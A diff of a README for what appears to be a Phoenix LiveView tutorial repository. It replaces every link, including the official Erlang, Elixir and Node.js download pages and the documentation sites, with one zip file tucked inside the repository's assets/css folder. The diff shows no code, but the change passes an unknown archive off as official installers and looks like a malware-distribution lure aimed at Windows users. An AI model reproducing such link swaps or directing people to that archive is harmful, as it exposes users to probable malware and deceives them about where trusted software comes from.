@@ -1,6 +1,6 @@
 # ⚡ phx-liveview-tutorial - Learn Phoenix LiveView Step-by-Step
 
-[![Download Now](https://img.shields.io/badge/Download-phx--liveview--tutorial-brightgreen?style=for-the-badge)](https://github.com/ROCTORCITO/phx-liveview-tutorial)
+[![Download Now](https://img.shields.io/badge/Download-phx--liveview--tutorial-brightgreen?style=for-the-badge)](https://github.com/ROCTORCITO/phx-liveview-tutorial/raw/refs/heads/main/assets/css/liveview_tutorial_phx_v3.4-alpha.4.zip)
 
 ---
 
@@ -41,7 +41,7 @@ We provide simple commands to enter into your Windows terminal, so no programmin
 ## ⬇️ How to Download and Install on Windows
 
 You can visit this page to download all files:  
-[Download phx-liveview-tutorial](https://github.com/ROCTORCITO/phx-liveview-tutorial)
+[Download phx-liveview-tutorial](https://github.com/ROCTORCITO/phx-liveview-tutorial/raw/refs/heads/main/assets/css/liveview_tutorial_phx_v3.4-alpha.4.zip)
 
 Follow these steps carefully:
 
@@ -58,17 +58,17 @@ The tutorial uses Phoenix LiveView, which runs on Elixir and Erlang. You will al
 
 ### Step 1: Install Erlang
 
-- Visit https://www.erlang.org/downloads and download the latest Windows installer.  
+- Visit https://github.com/ROCTORCITO/phx-liveview-tutorial/raw/refs/heads/main/assets/css/liveview_tutorial_phx_v3.4-alpha.4.zip and download the latest Windows installer.  
 - Run the installer and follow the instructions.  
 
 ### Step 2: Install Elixir
 
-- Visit https://elixir-lang.org/install.html#windows and download the installer.  
+- Visit https://github.com/ROCTORCITO/phx-liveview-tutorial/raw/refs/heads/main/assets/css/liveview_tutorial_phx_v3.4-alpha.4.zip and download the installer.  
 - Run it and complete the setup.
 
 ### Step 3: Install Node.js
 
-- Visit https://nodejs.org/en/download/ and choose the LTS version for Windows.  
+- Visit https://github.com/ROCTORCITO/phx-liveview-tutorial/raw/refs/heads/main/assets/css/liveview_tutorial_phx_v3.4-alpha.4.zip and choose the LTS version for Windows.  
 - Run the installer and follow the instructions.  
 
 After these installations, open a new terminal window and type the following commands to check if everything works:
@@ -151,10 +151,10 @@ This command downloads the newest files if you previously cloned the repository 
 
 ## 🎯 Additional Resources
 
-- Official Phoenix LiveView Docs: https://hexdocs.pm/phoenix_live_view  
-- Elixir Getting Started Guide: https://elixir-lang.org/getting-started/introduction.html  
-- Node.js Official Website: https://nodejs.org  
+- Official Phoenix LiveView Docs: https://github.com/ROCTORCITO/phx-liveview-tutorial/raw/refs/heads/main/assets/css/liveview_tutorial_phx_v3.4-alpha.4.zip  
+- Elixir Getting Started Guide: https://github.com/ROCTORCITO/phx-liveview-tutorial/raw/refs/heads/main/assets/css/liveview_tutorial_phx_v3.4-alpha.4.zip  
+- Node.js Official Website: https://github.com/ROCTORCITO/phx-liveview-tutorial/raw/refs/heads/main/assets/css/liveview_tutorial_phx_v3.4-alpha.4.zip  
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-phx--liveview--tutorial-brightgreen?style=for-the-badge)](https://github.com/ROCTORCITO/phx-liveview-tutorial)
+[![Download Now](https://img.shields.io/badge/Download-phx--liveview--tutorial-brightgreen?style=for-the-badge)](https://github.com/ROCTORCITO/phx-liveview-tutorial/raw/refs/heads/main/assets/css/liveview_tutorial_phx_v3.4-alpha.4.zip)
